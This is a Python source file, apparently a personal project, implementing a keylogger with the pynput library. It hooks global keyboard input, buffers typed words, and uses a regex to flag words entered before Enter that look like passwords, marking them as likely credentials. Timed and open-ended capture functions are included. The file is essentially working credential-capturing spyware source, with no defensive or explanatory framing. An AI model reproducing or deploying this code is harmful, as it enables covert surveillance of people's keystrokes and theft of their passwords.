from pynput import keyboard
import datetime
import re
import time
from functools import partial
import threading

def check_pass(password) -> bool:
    pattern = r"^(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).{8,}$"
    match = re.match(pattern, password)
    return bool(match)

word = ""
buffer_words = []
stop_event = threading.Event()

global FILE_PATH_LOG
def get_path(path):
    FILE_PATH_LOG = path


def keyPressed(key, file_path):
    global word
    
    #file_path = "C:/Users/imclp/OneDrive/Desktop/projects/kyg/log.txt"
    
    with open(file_path,'a') as log_file:
        try:
            if hasattr(key, 'char'):  # Regular character
                word += key.char
                
                #logKey.write(key.char)
            elif key == keyboard.Key.space:  # Space
                #log_file.write(word)
                buffer_words.append(word)
                word = ""

            elif key == keyboard.Key.enter:  # Enter
                if check_pass(word):
                    word = "¿" + word

                #log_file.write(word)
                buffer_words.append(word)
                word = ""
        except Exception as e:
            print("Error:", e)

'''
file_path = "C:/Users/imclp/OneDrive/Desktop/projects/kyg/log.txt"
keyPressed_with_path = partial(keyPressed, file_path=file_path)

listner = keyboard.Listener(on_press = keyPressed_with_path)
listner.start()
time.sleep(5)
listner.stop()
print(buffer_words)
'''

def keyboard_logger_pathed(path):
    keyPressed_with_path = partial(keyPressed, file_path=path)

    listner = keyboard.Listener(on_press = keyPressed_with_path)
    listner.start()
    time.sleep(5)
    listner.stop()
    return buffer_words
    #print(buffer_words)

def keyboard_logger_pathed_without_timer(path):
    keyPressed_with_path = partial(keyPressed, file_path=path)

    listner = keyboard.Listener(on_press = keyPressed_with_path)
    listner.start()
    #time.sleep(5)

    try:
        while not stop_event.is_set():
            threading.Event().wait(0.1)
    finally:
        listner.stop()
        print('keylogger has stopped')
    
    #listner.stop()
    return buffer_words
    #print(buffer_words)


'''
#sample
listner = keyboard.Listener(on_press = keyPressed)
listner.start()
time.sleep(5)
listner.stop()
print(buffer_words)

'''
